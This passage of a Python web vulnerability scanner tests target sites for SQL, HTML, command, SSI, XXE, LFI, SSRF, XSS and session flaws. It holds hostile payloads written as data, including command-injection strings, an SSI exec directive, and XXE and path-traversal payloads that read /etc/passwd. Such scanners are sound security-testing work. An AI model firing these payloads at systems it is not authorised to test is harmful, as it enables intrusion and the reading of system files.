            form_list, form_data_list = self.extract_forms_and_form_data(url)
            for index, form in enumerate(form_list):
                # Test SQL Injections and print results
                sql_vuln, sql_type, sql_conf = self.t_i_sql(url, form, form_data_list[index])
                if sql_vuln:
                    if 0 < sql_conf <= 3:
                        html_report.add_vulnerability('SQL Injection',
                                                      'SQL Injection vulnerability identified on form. URL: {}. Vulnerability Type: {}.'.format(
                                                          url, self.pretty_sql(str(sql_type))), 'Medium')
                    else:
                        html_report.add_vulnerability('SQL Injection',
                                                      'SQL Injection vulnerability identified on form. URL: {}. Vulnerability Type: {}'.format(
                                                          url, self.pretty_sql(str(sql_type))), 'Critical')
            # Bulk up User-Agent SQL Injection detection in the same function
            if self.t_i_ua_sql(url):
                html_report.add_vulnerability('SQL Injection - User Agent',
                                              'SQL Injection vulnerability identified on URL: {} using custom User-Agent.'.format(
                                                  url), 'Critical')

            # Scan inputs outside forms/with no actionable form
            if self.t_i_sql_nfi(url):
                html_report.add_vulnerability('SQL Injection',
                                              'Time based (Blind) SQL Injection vulnerability identified on URL: {}.'.format(
                                                  url), 'Medium')

            if self.t_i_xml_sql(url):
                html_report.add_vulnerability('SQL Injection in XML tag',
                                              'SQL Injection in XML tag vulnerability identified on URL: {} using custom XML tags.'.format(
                                                  url), 'Critical')
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for SQL Injection.", url)
            pass

    def t_i_html(self, url, form, form_data): # TODO: Remove comprehensive tag
        # TODO: Think of a method for adding confidence dynamically
        try:
            # Select injection points from form details
            confidence = 0
            injection_keys = self.extract_injection_fields_from_form(form_data)
            for html_payload in self.DataStorage.payloads("HTML"):
                # Inject each payload into each injection point
                for injection_key in injection_keys:
                    form_data[injection_key] = html_payload
                response_injected = self.submit_form(url, form, form_data)
                if not response_injected:
                    return 0, 0
                # Check for html_payload (tags included) in response, success execution if available.
                if html_payload in response_injected.text:
                    confidence += 1
                if self.comprehensive_scan is False and confidence > 0:
                    return True, confidence
                elif self.comprehensive_scan is True and html_payload == self.DataStorage.payloads("HTML")[
                    -1] and confidence > 0:
                    return True, confidence
            return False, 0
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing HTML Injection.", url)
            pass

    def t_i_html_nfi(self, url):
        try:
            for html_payload in self.DataStorage.payloads("HTML"):
                # Inject each payload into each injection point
                response_injected = self.no_form_input_content(url, html_payload)
                if not response_injected:
                    return 0
                # Check for html_payload (tags included) in response, success execution if available.
                for response_inj in response_injected:
                    if html_payload in response_inj.text:
                        return True
            return False
        except Exception as e:
            self.print_except_message('error', e,
                                      "Something went wrong when testing HTML Injection with non-form inputs.", url)
            pass

    def scan_html(self, url):
        try:
            form_list, form_data_list = self.extract_forms_and_form_data(url)
            for index, form in enumerate(form_list):
                html_vuln, confidence = self.t_i_html(url, form, form_data_list[index])
                # Print if Vulnerabilities are found.
                if html_vuln:
                    if 0 < confidence <= 3:
                        html_report.add_vulnerability('HTML Injection',
                                                      'HTML Injection Vulnerability identified on URL: {}.'.format(
                                                          url), 'Low')
                    else:
                        html_report.add_vulnerability('HTML Injection',
                                                      'HTML Injection Vulnerability identified on URL: {}.'.format(
                                                          url), 'High')
            # Test on non-form inputs
            if self.t_i_html_nfi(url):
                html_report.add_vulnerability('HTML Injection',
                                              'HTML Injection Vulnerability identified on URL: {}.'.format(
                                                  url), 'Medium')
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing HTML Injection.", url)
            pass

    def t_i_iframe(self, url, iframe):
        try:
            # iFrame payload is another page.
            iframe_payload = 'https://www.google.com'
            iframe_url = self.build_iframe_url(url, iframe, iframe_payload)
            # If iFrame loads the new page it means it is vulnerable.
            if iframe_url:
                if iframe_payload in self.session.get(iframe_url).text.lower():
                    html_report.add_vulnerability('iFrame Injection',
                                                  'iFrame Injection Vulnerability identified on URL: {}.'.format(
                                                      url), 'Low')
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for iFrame Injection.", url)
            pass

    def scan_iframe(self, url):
        try:
            # Perform tests for each iFrame
            for iframe in self.extract_iframes(url):
                self.t_i_iframe(url, iframe)
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for iFrame Injection.", url)
            pass

    def t_i_code_exec(self, url, form, form_data):
        try:
            # Detects blind and standard Code Exec (Ping for 3 seconds)
            code_exec_payload = "|ping -c 7 127.0.0.1" # 8.8.8.8|cat /etc/passwd
            # Get injection points and inject the payload.
            injection_keys = self.extract_injection_fields_from_form(form_data)
            for injection_key in injection_keys:
                form_data[injection_key] = html.unescape(code_exec_payload)
            response = self.submit_form(url, form, form_data)
            if not response:
                return 0
            # Detect both blind and standard Code Execs.
            if response.elapsed.total_seconds() > 1.5:
                return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for Code Execution Injection.",
                                      url)
            pass

    def t_i_code_exec_nfi(self, url):
        try:
            # Detects blind and standard Code Exec (Ping for 3 seconds)
            code_exec_payload = "| ping -c 3 127.0.0.1"
            response_injected = self.no_form_input_content(url, code_exec_payload)
            if not response_injected:
                return 0
            # Detect both blind and standard Code Execs.
            for response_inj in response_injected:
                if response_inj.elapsed.total_seconds() > 1.5:
                    return True
            return False
        except Exception as e:
            self.print_except_message('error', e,
                                      "Something went wrong when testing for Code Execution Injection in non-form inputs.",
                                      url)
            pass

    def scan_code_exec(self, url):
        try:
            form_list, form_data_list = self.extract_forms_and_form_data(url)
            for index, form in enumerate(form_list):
                if self.t_i_code_exec(url, form, form_data_list[index]):
                    html_report.add_vulnerability('Code Execution Injection',
                                                  'Code Execution Injection Vulnerability identified on URL: {}.'.format(
                                                      url), 'High')

            # Non-form input
            if self.t_i_code_exec_nfi(url):
                html_report.add_vulnerability('Code Execution Injection',
                                              'Code Execution Injection Vulnerability identified on URL: {}.'.format(
                                                  url), 'High')
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for Code Execution Injection.",
                                      url)
            pass

    def t_i_php_exec(self, url):
        try:
            # URL escaped since it is injected into URL
            php_exec_payload = "%60ping%20-c%203%20127.0.0.1%60"
            # Extract all injectable values, since it is applied for URL, look into URL only
            values_after_equal = re.findall('(?<==)[^&]+', url)
            if values_after_equal:
                for value in values_after_equal:
                    # Injection into URL each value
                    url = url.replace(value, php_exec_payload)
            else:
                return
            # Get response time, detects both blind and standard PHP injections
            response = self.session.get(url)
            if response.elapsed.total_seconds() > 1.5:
                return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for PHP Code Execution Injection.",
                                      url)
            pass

    def scan_php_exec(self, url):
        try:
            if self.t_i_php_exec(url):
                html_report.add_vulnerability('PHP Code Execution Injection',
                                              'PHP Code Execution Injection Vulnerability identified on URL: {}.'.format(
                                                  url), 'High')
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for PHP Code Execution Injection.",
                                      url)
            pass

    def t_i_ssi(self, url, form, form_data):
        try:
            # Non-blind detection. Search for UNIX time format in response.
            ssi_payload = '<!--#exec cmd=netstat -->'
            # Inject only injectable fields
            injection_keys = self.extract_injection_fields_from_form(form_data)
            for injection_key in injection_keys:
                form_data[injection_key] = ssi_payload
            response = self.submit_form(url, form, form_data)
            if not response:
                return False
            if 'active internet connections' in str(response.text).lower():
                return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for SSI (Server-Side Includes).",
                                      url)
            pass

    def t_i_ssi_nfi(self, url):
        try:
            # Non-blind detection. Search for UNIX time format in response.
            ssi_payload = '<!--#exec cmd=netstat -->'
            response_injected = self.no_form_input_content(url, ssi_payload)
            if not response_injected:
                return False
            for response_inj in response_injected:
                if 'active internet connections' in str(response_inj.text).lower():
                    return True
            return False
        except Exception as e:
            self.print_except_message('error', e,
                                      "Something went wrong when testing for SSI (Server-Side Includes) in non-form inputs.",
                                      url)
            pass

    def scan_ssi(self, url):
        try:
            form_list, form_data_list = self.extract_forms_and_form_data(url)
            for index, form in enumerate(form_list):
                if self.t_i_ssi(url, form, form_data_list[index]):
                    html_report.add_vulnerability('SSI Code Execution Injection',
                                                  'SSI Code Execution Injection Vulnerability identified on URL: {}.'.format(
                                                      url), 'High')
            # Scan non-form inputs
            if self.t_i_ssi_nfi(url):
                html_report.add_vulnerability('SSI Code Execution Injection',
                                              'SSI Code Execution Injection Vulnerability identified on URL: {}.'.format(
                                                  url), 'High')
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for SSI (Server-Side Includes).",
                                      url)
            pass

    def t_i_xml(self, url, payload):
        try:
            # Extract injectable tags from URL
            extracted_uri, extracted_tag = self.extract_xml_tags(url)
            # If injectable tags exists
            if extracted_uri and extracted_tag:
                # Get the first content of the first identified tag and inject it with the custom XXE variable
                prepared_tag =  re.sub(r'(<[^>]+>)([^<]+)(</[^>]+>)', r'\1' + '&XXE;' + r'\3', extracted_tag, count=1)
                # Prepare the payload with specific requirements such as identified tags.
                xml_payload = '''<?xml version="1.0" encoding="utf-8"?>
                <!DOCTYPE root [<!ENTITY XXE SYSTEM "{}"> ]>
                {}'''.format(payload, prepared_tag)

                # Prepare URL for injection, URL consist of custom POST request of XML.
                pattern_url = r'(.*/)[^/]+$'
                prepared_url = re.sub(pattern_url, r'\1' + extracted_uri, url)

                # Return the pre-build URL and the custom XML payload
                return prepared_url, xml_payload
            # Generic attempt to XML Injection, inject custom payload in fake tags.
            else:
                xml_payload = '''<?xml version="1.0" encoding="utf-8"?>
                                <!DOCTYPE root [<!ENTITY XXE SYSTEM "{}"> ]>
                                <bongus><bongus2>&XXE</bongus2><bongus3>&XXE</bongus3></bongus>'''.format(payload)
                # if 'error' in str(self.session.post(url, data=xml_payload, headers={'Content-Type': 'application/xml'}).content):
                #     return True, 'Low'
                return None, xml_payload
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for XML Injection.", url)
            pass
        
    def scan_xml_generic(self, url):
        try:
            payload = 'file:///etc/passwd' # TODO: Might need to add other payloads
            # Get the custom values of the page and try to inject them if possible.
            custom_url, custom_payload = self.t_i_xml(url, payload)
            if custom_url and custom_payload:
                response = self.session.post(custom_url, data=custom_payload, headers={'Content-Type': 'application/xml'})
                if 'root' in response.text.lower():
                    html_report.add_vulnerability('XXE Injection',
                                                  'XXE Injection Vulnerability identified on URL: {}.'.format(
                                                      url), 'Critical')
            # If specific injection cannot be performed, try generic approach.
            elif custom_url is None and custom_payload:
                if 'error' in str(self.session.post(url, data=payload, headers={'Content-Type': 'application/xml'}).content):
                    html_report.add_vulnerability('XXE Injection',
                                                  'XXE Injection Vulnerability identified on URL: {}.'.format(
                                                      url), 'High')
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for Generic XML Injection.", url)
            pass

    # Broken Authentication & Session Mgmt

    def t_ba_role_definition_cookie(self):
        try:
            # Search for specific keywords that define roles in the cookies.
            cookie_dict = self.extract_cookies()
            if "isadmin" in str(cookie_dict).lower():
                if str(cookie_dict.lower()["isAdmin"]).lower() == "true" or \
                        str(cookie_dict.lower()["isAdministrator"]).lower() == "true" or \
                        str(cookie_dict.lower()["admin"]).lower() == "true" or \
                        str(cookie_dict.lower()["administrator"]).lower() == "true":
                    return True
            if "role" in str(cookie_dict).lower():
                if str(cookie_dict.lower()["role"]).lower() == "admin" or \
                        str(cookie_dict.lower()["role"]).lower() == "administrator" or \
                        str(cookie_dict.lower()["role"]).lower() == "manager" or \
                        str(cookie_dict.lower()["role"]).lower() == "auditor" or \
                        str(cookie_dict.lower()["role"]).lower() == "mod":
                    return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for role definition on cookies.")
            pass

    def scan_role_def_cookie(self, url):
        try:
            if self.t_ba_role_definition_cookie():
                html_report.add_vulnerability('Administrator roles defined in Cookie',
                                              'Administrator roles defined in Cookie identified on URL: {}. Session can be hijacked!'.format(
                                                  url), 'High')
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for role definition on cookies.",
                                      url)
            pass

    def t_ba_role_definition_directories(self, url):
        # Search for specific keywords that define roles in the URLs
        try:
            link = url.lower()
            if "admin" in link or "administrator" in link or "mod" in link or "moderator" in link:
                return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for role definition directories.",
                                      url)
            pass

    def scan_role_def_dir(self, url):
        try:
            if self.t_ba_role_definition_directories(url):
                html_report.add_vulnerability('Administrator roles defined in URL',
                                              'Administrator roles defined in URL identified on URL: {}. Session can be hijacked!'.format(
                                                  url), 'High')
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for role definition directories.",
                                      url)
            pass

    def t_ba_session(self, url):
        # Search for session in the cookie.
        try:
            cookie_dict = self.extract_cookies()
            if ("sid" or "sessionid" or "session" or "sessiontoken" or "sessid") in str(cookie_dict).lower():
                if 'secure' not in str(cookie_dict).lower() or 'httponly' not in str(cookie_dict).lower():
                    return True, cookie_dict
            return False, None
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when checking the session.", url)
            pass

    def scan_session(self, url):
        try:
            session_vuln, curr_session_cookies = self.t_ba_session(url)
            if session_vuln:
                if self.t_ba_strong_session(url, curr_session_cookies):
                    html_report.add_vulnerability('Insecure Session (HTTPS)',
                                                  'Insecure Session (HTTPS) identified on URL: {}. Session was successfully hijacked!'.format(
                                                      url), 'Medium')
                else:
                    html_report.add_vulnerability('Insecure Session (HTTP)',
                                                  'Insecure Session (HTTP) identified on URL: {}. Session was successfully hijacked!'.format(
                                                      url), 'Medium')
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when checking the session.", url)
            pass

    def t_ba_browser_cache_weakness(self, url):
        try:
            response = self.session.get(url)
            if "Cache-Control" in str(response.headers):
                if (response.headers["Cache-Control"] != "no-store" and response.headers[
                    "Cache-Control"] == "no-cache, must-revalidate") or \
                        (response.headers["Cache-Control"] == "no-store" and
                         response.headers["Cache-Control"] != "no-cache, must-revalidate"):
                    return False
            return True
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing browser cache.", url)
            pass

    def scan_browser_cache(self):
        try:
            if self.t_ba_browser_cache_weakness(self.url):
                html_report.add_vulnerability('Cache Weakness',
                                              'Potential Browser Cache Weakness vulnerability identified.'.format(
                                                  self.url), 'Low')
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing browser cache.", self.url)
            pass

    def t_ba_strong_session(self, url, cookies):
        try:
            new_user = CreateUserSession(url, self.username, self.password, "2")
            new_user_cookies = new_user.extract_cookies()
            for key, value in cookies.items():
                if ("sid" or "sessionid" or "session" or "sessiontoken" or "sessid") in str(key).lower():
                    current_session = value
            for key, value in new_user_cookies.items():
                if ("sid" or "sessionid" or "session" or "sessiontoken" or "sessid") in str(
                        key).lower() and current_session:
                    new_user.session.cookies[str(key)] = str(current_session)
                    print(
                        new_user.session.cookies.get_dict())  # TODO: Find why session wont be chanced ffs and check alternative ways of identification
            new_user_response = new_user.session.get(url)
            # print("old", cookies)
            # print(new_user.session.cookies.get_dict())
            # if 'login' not in new_user_response.url.lower():
            #     return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for strong sessions.", url)
            pass

    # Cross Site Scripting

    def t_i_xss(self, url, form, form_data):
        try:
            confidence = 0
            injection_keys = self.extract_injection_fields_from_form(form_data)
            for xss_payload in self.DataStorage.payloads("XSS"):
                # Inject each payload into each injection point
                for injection_key in injection_keys:
                    form_data[injection_key] = xss_payload
                response_injected = self.submit_form(url, form, form_data)
                if not response_injected:
                    continue
                # TODO :Figure why payload is not in response when it is
                if (str(xss_payload).lower() in str(response_injected.text).lower()) or (str(xss_payload).lower() in str(html.unescape(response_injected.text.lower()))):
                    confidence += 1
                if self.comprehensive_scan is False and confidence > 0:
                    return True, confidence
                elif self.comprehensive_scan is True and xss_payload == self.DataStorage.payloads("XSS")[
                    -1] and confidence > 0:
                    return True, confidence
            return False, 0
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong testing XSS in form.", url)
            pass

    def t_i_xss_nfi(self, url):
        try:
            for xss_payload in self.DataStorage.payloads("XSS"):
                response_injected = self.no_form_input_content(url, xss_payload)
                if not response_injected:
                    return False
                for response_inj in response_injected:
                    if xss_payload.lower() in response_inj.text.lower():
                        return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong testing XSS in form.", url)
            pass

    def t_ua_xss(self, url):
        try:
            for payload in self.DataStorage.payloads("XSS"):
                # Inject headers with payloads
                headers = self.custom_user_agent(payload)
                try:
                    response = self.session.get(url, timeout=300, headers=headers)
                except Exception:
                    continue
                # Check response type (time or feedback)
                if payload.lower() in response.text.lower():
                    return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for User-Agent XSS Injections.",
                                      url)
            pass

    def scan_xss(self, url):
        try:
            form_list, form_data_list = self.extract_forms_and_form_data(url)
            for index, form in enumerate(form_list):
                xss_vuln, confidence = self.t_i_xss(url, form, form_data_list[index])
                if xss_vuln:
                    if 0 < confidence <= 3:
                        html_report.add_vulnerability('XSS Injection',
                                                      'XSS Injection vulnerability identified on form. URL: {}'.format(
                                                          url), 'High')
                    else:
                        html_report.add_vulnerability('XSS Injection',
                                                      'XSS Injection vulnerability identified on form. URL: {}'.format(
                                                          url), 'Critical')
            if self.t_i_xss_nfi(url):
                html_report.add_vulnerability('XSS Injection',
                                              'XSS Injection vulnerability identified on URL: {}'.format(
                                                  url), 'High')
            if self.t_ua_xss(url):
                html_report.add_vulnerability('XSS Injection',
                                              'XSS Injection vulnerability identified using custom User-Agent. URL: {}'.format(
                                                  url), 'Critical')
            return 0
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong testing XSS in form.", url)
            pass

    # Insecure Direct Object References
    def t_idor(self, url, form_data):
        try:
            if self.check_hidden_tag(url, form_data):
                return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing IDOR.", url)
            pass

    def t_idor_nfi(self, url):  # TODO: Modify IDOR to be generic
        try:
            attempts = 0
            sub_string = re.findall('[?](.*)[=]*\d', url)
            if sub_string:
                index_from_url = int(str(re.findall('\d', str(sub_string))))
                response = self.session.get(url)
                while attempts < 10:
                    try:
                        url.replace(str(index_from_url), index_from_url + 1)
                        response_2 = self.session.get(url)
                        if response != response_2 and str(response_2.status_code).startswith("2"):
                            return True
                    except Exception:
                        index_from_url += 1
                        attempts += 1
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing IDOR.", url)
            pass

    def scan_idor(self, url):
        try:
            if self.t_idor_nfi(url):
                html_report.add_vulnerability('IDOR',
                                              'Insecure direct object reference (IDOR) vulnerability identified. URL: {}'.format(
                                                  url), 'Medium')
            form_list, form_data_list = self.extract_forms_and_form_data(url)
            for index, form in enumerate(form_list):
                if self.t_idor(url, form_data_list[index]):
                    html_report.add_vulnerability('IDOR',
                                                  'Insecure direct object reference (IDOR) vulnerability identified on form. URL: {}'.format(
                                                      url), 'Medium')
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing IDOR.", url)
            pass

    # Security Misconfigurations

    def t_cors(self, url):
        try:
                if self.session.get(url).headers['Access-Control-Allow-Origin'] == '*':
                    return True
                return
        except Exception:
            # Blank by design.
            pass

    def scan_cors(self, url):
        try:
            if self.t_cors(url):
                html_report.add_vulnerability('Cross-Origin Resource Sharing',
                                              'Cross-Origin Resource Sharing (CORS) vulnerability identified on URL: {}'.format(
                                                  url), 'Low')
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for CORS.", url)
            pass

    def t_xst(self, url):
        try:
            trace_request = requests.Request('TRACE', url)
            prepared_trace = trace_request.prepare()
            if self.session.send(prepared_trace).status_code == 200:
                return True
            return False
        except Exception:
            pass

    def scan_xst(self):
        try:
            if self.t_xst(self.url):
                html_report.add_vulnerability('Cross-Site Tracing (XST)',
                                              'Cross-Site Tracing (XST) vulnerability identified on URL: {}'.format(
                                                  self.url), 'Low')
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for XST.", self.url)
            pass

    def scan_robotstxt(self):  # https://github.com/danielmiessler/RobotsDisallowed/blob/master/top1000.txt
        try:  # TODO: Create detection of sensitive data in this robots by the above URL
            if 'robots' not in self.url and self.static_scan is None:
                url_robots = urllib.parse.urljoin(self.url, '/robots.txt')
            else:
                url_robots = self.url
            req_robots = self.session.get(url_robots)
            robots_urls = re.findall('Disallow: (.*)', req_robots.text)
            if robots_urls:
                html_report.add_vulnerability('Robots.txt',
                                              'Robots.txt contains the following values: \n{}'.format(
                                                  [i.replace("'", "") for i in robots_urls]),
                                              'Informational')  # TODO: Prettify the print of robots contents to report or to HTML report
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing Robots.txt.", self.url)
            pass

    # Sensitive Data Exposure
    def t_i_host_header(self, url):
        try:
            host = {'Host': 'google.com'}
            host_injection = self.session.get(url, headers=host)
            x_host = {'X-Forwarded-Host': 'google.com'}
            x_host_injection = self.session.get(url, headers=x_host)
            if host_injection.status_code == 200 and str(host_injection.url) == str(url):
                return True
            elif x_host_injection.status_code == 200 and str(x_host_injection.url) == str(url):
                return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing Host Header Injection.", url)
            pass

    def scan_hhi(self):
        try:
            if self.t_i_host_header(self.url):
                html_report.add_vulnerability('Host-Header Injection',
                                              'Host-Header Injection vulnerability identified on URL: {}'.format(
                                                  self.url), 'Low')
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for Host Header Injection.", self.url)
            pass

    def t_i_ssrf(self, url):  # TODO: Add more payloads
        try:
            if '=' in url:
                ssrf_payload = "=https://www.google.com/"
                url = url.replace('=', ssrf_payload)
                response = self.session.get(url)
                if ssrf_payload in url and response.status_code == 200:
                    return True
                ssrf_payload = '=file:///etc/passwd'
                url = url.replace('=', ssrf_payload)
                if ssrf_payload in url and "root:" in response.text.lower():
                    return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for Server Side Request-Forgery (SSRF).", url)
            pass

    def scan_ssrf(self, url):
        try:
            if self.t_i_ssrf(url):
                html_report.add_vulnerability('Server Side Request Forgery',
                                              'Server Side Request Forgery (SSRF) vulnerability identified on URL: {}'.format(
                                                  url), 'Low')
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for Server Side Request-Forgery (SSRF).", url)
            pass

    def t_i_lfi(self, url):
        try:
            # for html_payload in self.DataStorage.payloads("HTML"): #TODO: Add more payloads LFI/RFI
            lfi_script = '/../../../etc/passwd'
            if '=' in url:
                url = re.sub(r'=(?!.*=).*$', f'={lfi_script}', url)
                if "root:" in self.session.get(url).text.lower():
                    return True
            form_list, form_data_list = self.extract_forms_and_form_data(url)
            for index, form in enumerate(form_list):
                injection_keys = self.extract_injection_fields_from_form(form_data_list[index])
                # for html_payload in self.DataStorage.payloads("HTML"): #TODO: Add more payloads LFI/RFI
                lfi_script = '/../../../etc/passwd'
                # Inject each payload into each injection point
                for injection_key in injection_keys:
                    form_data_list[index][injection_key] = lfi_script
                response_injected = self.submit_form(url, form, form_data_list[index])
                if "root:" in response_injected.text.lower():
                    return True
            return False
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for Local File Inclusion (LFI).", url)
            pass

    def scan_lfi(self, url):
        try:
            if self.t_i_lfi(url):
                html_report.add_vulnerability('Local File Inclusion (LFI)', 'Local File Inclusion (LFI) vulnerability identified on URL: {}'.format(url), 'High')
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for Local File Inclusion (LFI).", url)
            pass

    def t_i_js(self, url):
        try:
            js_payload = '/?javascript:alert(testedforjavascriptcodeexecutionrn3284)' # TODO: Add more payloads
            if url[-1] != '/':
                new_url = url + js_payload
                return js_payload in str(self.session.get(new_url).text).lower()
            else:
                new_url = url + js_payload[1:]
                return js_payload[1:] in str(self.session.get(new_url).text).lower()
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for Javascript Execution.", url)
            pass

    def scan_js(self, url):
        try:
            if self.t_i_js(url):
                html_report.add_vulnerability('Javascript Code Injection', 'Javascript Code Injection vulnerability identified on URL: {}'.format(url), 'High')
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for Javascript Execution.", url)
            pass

    def scan_comments(self, url):
        try:
            # Get comments from the DOM on each URL.
            comm_dict = {}
            comments = re.findall('(?<=<!--)(.*)(?=-->)', str(self.session.get(url).text))
            comm_dict.update({url: comments})
            # Print comments to report
            html_report.add_comments(comm_dict)
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for Javascript Execution.", url)
            pass

    def scan_http(self):
        try:
            response = self.session.put(str(self.url) + '/test.html', data={"test": 'test'})
            if str(response.status_code).startswith("3") or str(response.status_code).startswith("2"):
                html_report.add_vulnerability('HTTP PUT Method Vulnerability', 'Application accepts custom PUT data on URL: {}'.format(self.url), 'Low')
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing for Javascript Execution.", self.url)
            pass

    # HTTP Strict Transport Security
    def scan_hsts(self):
        try:
            headers = self.extract_headers(self.url)
            if 'strict' not in str(headers).lower():
                html_report.add_vulnerability('HTTP Strict Transport Security not found',
                                              'Application might be vulnerable to sniffing and certificate invalidation attacks. URL: {}'.format(self.url), 'Low')

            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing Strict Transport on headers.", self.url)
            pass


    def scan_ria(self):
        try:
            content = None
            if 'clientaccesspolicy.xml' in self.url.lower() or 'crossdomain.xml' in self.url.lower():
                content = self.session.get(self.url)
            try:
                if '*' in content:
                    html_report.add_vulnerability('Overly Permissive Policy File found',
                                                  'Review Crossdomain.xml / Clientaccesspolicy.xml files. URL: {}'.format(
                                                      self.url), 'Low')
            except TypeError:
                pass
            return
        except Exception as e:
            self.print_except_message('error', e, "Something went wrong when testing RIA.", self.url)
            pass


class CreateUserSession(Utilities):  # TODO: Create another py module for the new user.
    try:
        def __init__(self, url, username, password, sec_level=None):
            self.user = Utilities.__init__(self, url, username, password)
            # self.check_scan_build_url(url, username, password, sec_level=sec_level)
    except Exception as e:
        print(Fore.RED + "\n[ERROR] Something went wrong when creating a new user session. Quitting..\n")
        print(Fore.RESET)
        print("Error: ", e)


# Get hidden Paths # TODO: Find way to find hidden URLs/ alternative paths/directory transversal all kinds - https://github.com/jcesarstef/dotdotslash
# Get Info # TODO: Get app information/versions with nmap
# Check SSL Certificate # TODO: Check TLS version and security


if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser(description='Scan Web Application for Vulnerabilities')
        # Provide argument for URL. URL does not require flag but requires 'URL'.
        parser.add_argument("url", type=str, help="Provide an URL to scan")
        # Get Credentials for login if needed. Flags not mandatory/
        parser.add_argument("-u", "--username", help="Username to login with")
        parser.add_argument("-p", "--password", help="Password to login with")
        # Provide static scan argument, default is crawling. Static (or single) only tests the provided URL.
        parser.add_argument("-s", "--static_scan", help="Scan a single URL provided in the terminal",
                            action="store_true", default=False)
        # Comprehensive tests forces the all tests to be performed.
        parser.add_argument("-c", "--comprehensive_scan",
                            help="Scan the application against all vulnerability tests available", action="store_true",
                            default=False)

        args = parser.parse_args()
        # If username and password is provided, continue with checking if static flag is required or not.
        if args.username and args.password:
            if args.static_scan:
                # Sent the relevant arguments in relation to the required scan type.
                if re.match('^http|https?://', args.url):
                    Scanner = Scanner(args.url, args.username, args.password, static_scan=args.static_scan,
                                      comprehensive_scan=args.comprehensive_scan)
                else:
                    Scanner = Scanner('http://' + args.url, args.username, args.password, static_scan=args.static_scan,
                                      comprehensive_scan=args.comprehensive_scan)
            # If static scan not required, continue without flag and perform scan type.
            else:
                if re.match('^http|https?://', args.url):
                    Scanner = Scanner(args.url, args.username, args.password,
                                      comprehensive_scan=args.comprehensive_scan)
                else:
                    Scanner = Scanner('http://' + args.url, args.username, args.password,
                                      comprehensive_scan=args.comprehensive_scan)
        # If no username AND password is provided, determine scan type and try to scan. If username and password are required but not provided, app will throw an error.
        elif not (args.username and args.password):
            if args.static_scan:
                if re.match('^http|https?://', args.url):
                    Scanner = Scanner(args.url, static_scan=args.static_scan,
                                      comprehensive_scan=args.comprehensive_scan)
                else:
                    Scanner = Scanner('http://' + args.url, static_scan=args.static_scan,
                                      comprehensive_scan=args.comprehensive_scan)
            else:
                if re.match('^http|https?://', args.url):
                    Scanner = Scanner(args.url, comprehensive_scan=args.comprehensive_scan)
                else:
                    Scanner = Scanner('http://' + args.url, comprehensive_scan=args.comprehensive_scan)

        Scanner.scan()

    except Exception as e:
        print(Fore.RED + "\n[ERROR] FATAL ERROR OCCURRED. Quitting..\n")
        print(Fore.RESET)
        print("Error: ", e)
        quit()
